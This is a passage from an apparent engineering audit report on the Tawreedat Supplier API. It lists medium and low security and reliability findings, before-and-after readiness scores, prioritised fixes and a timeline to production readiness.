| VUL-01    | 30+ secrets default to "" if env missing  | `env.ts`                 | R2    |
| HIGH-01   | SMS OTP unimplemented                     | `auth.controller.ts`     | R1    |

### Medium Issues

| ID        | Title                                             | Round |
| --------- | ------------------------------------------------- | ----- |
| SEC-T-03  | Typing events bypass room membership              | R2    |
| RACE-02   | Rate limiter TOCTOU init race                     | R2    |
| RACE-03   | Wallet debit silent failure (count=0 not checked) | R2    |
| END-01    | No log rotation                                   | R2    |
| END-02    | Rate limiter memory grows without bounds          | R2    |
| END-04    | Stale socket entries on abnormal disconnect       | R2    |
| SOCKET-01 | readMessages bulk update without index            | R2    |
| SOCKET-02 | get_online_users returns unbounded list           | R2    |
| ARCH-01   | 1836-line auth.service monolith                   | R2    |
| ARCH-05   | Zero automated test coverage                      | R2    |
| LEAK-05   | Temp file not cleaned up on upload failure        | R2    |
| LOG-01    | `console.log({ isDev })` in error handler         | R2    |
| PRISMA-01 | Missing `select` projections throughout           | R2    |
| DB-02     | Stat aggregations not cached                      | R2    |

### Low Issues

| ID        | Title                                 | Round |
| --------- | ------------------------------------- | ----- |
| PEN-02    | OTP timing attack via `!==`           | R2    |
| END-03    | No Node.js memory limit set           | R2    |
| LEAK-01   | Dead `socket.io-client` import        | R2    |
| ARCH-02   | Arrow functions as class methods      | R2    |
| ARCH-04   | Numbered directory names with spaces  | R2    |
| PRISMA-02 | Two separate `update` calls in logout | R2    |
| PRISMA-04 | Unnecessary `$transaction` on reads   | R2    |

---

## 22. Final Verdict & Recommendations

### Updated Production Readiness Score

| Category                    | R1 Score | R2 Score | Change                                              |
| --------------------------- | -------- | -------- | --------------------------------------------------- |
| Functional Completeness     | 72       | 68       | ↓ (upload magic bytes, OTP brute force)             |
| API Integration Correctness | 68       | 65       | ↓ (webhook race condition)                          |
| Load Handling Readiness     | 35       | 33       | ↓ (bcrypt thread pool, spike behavior)              |
| Stress Resilience           | 25       | 22       | ↓ (no circuit breaker confirmed)                    |
| Security Posture            | 60       | 52       | ↓ (upload validation, XSS in chat, OTP brute force) |
| **Overall**                 | **52**   | **48**   | **↓ 4 points**                                      |

**Final Score: 48 / 100 — NOT PRODUCTION READY**

### Top 10 Actions Before Launch

| Priority | Action                                                     | Effort  | Impact   |
| -------- | ---------------------------------------------------------- | ------- | -------- |
| **P0-1** | Fix `if (NODE_ENV !== "production")` wrapping `app.listen` | 30 min  | Blocker  |
| **P0-2** | Add ownership check to all profile endpoints               | 2 hours | Critical |
| **P0-3** | Replace `?? ""` with `required()` for critical env vars    | 2 hours | Critical |
| **P0-4** | Fix `password_last_updated` in OTP password reset          | 30 min  | Critical |
| **P0-5** | Fix Paymob webhook idempotency race (unique constraint)    | 4 hours | Critical |
| **P1-1** | Increase `connectionLimit` to 50                           | 5 min   | High     |
| **P1-2** | Add magic byte validation to upload middleware             | 4 hours | High     |
| **P1-3** | Remove `socket.io-client` import from order.service        | 5 min   | Medium   |
| **P1-4** | Add `/health` endpoint                                     | 1 hour  | High     |
| **P1-5** | Remove `console.log({ isDev })` from error handler         | 5 min   | Medium   |

### Timeline to Production-Ready (Score ≥ 75)

```
Week 1:  P0 fixes (all 5 critical) + P1-1, P1-3, P1-5
         → Score estimate: 65/100

Week 2:  P1 remaining + Redis (rate limiting) + magic byte upload fix
         → Score estimate: 72/100

Week 3:  Redis Socket.IO adapter + graceful shutdown + /health endpoint
         + slow query logging + minimum test suite
         → Score estimate: 78/100 ✅ Production-ready threshold crossed

Month 2: ARCH improvements + full test coverage + background job queue
         → Score estimate: 85/100

Month 3: Horizontal scaling + read replica + full observability stack
         → Score estimate: 92/100
```

### Final Technical Statement

The Tawreedat Supplier API is a well-structured, thoughtfully designed platform with meaningful security improvements in recent refinements. The JWT hardening, Paymob HMAC verification, Zod validation, structured logging, and helmet integration all demonstrate a security-conscious development team.

The remaining blockers are not fundamental design flaws — they are implementation-level issues (an inverted if-condition, a missing WHERE clause, a too-small constant, a missing null check) that can be resolved in days, not weeks. The architectural concerns (monolithic auth service, no test suite, arrow function class methods) are valid medium-term improvements that do not block a careful initial production launch.

The platform is ready for **staging environment validation** immediately after P0 fixes, and ready for **controlled production launch** (limited traffic, not full scale) after Week 2 improvements.

---

_Report generated by: Engineering Audit Team_  
_Methodology: Static code analysis · Architectural review · Mathematical load modeling · Security threat modeling · Concurrency analysis · Dependency risk assessment_  
_Round 1 Report:_ `ROUND1_TESTING_REPORT.md`  
_Report coverage: Complete — all Round 2 areas addressed_
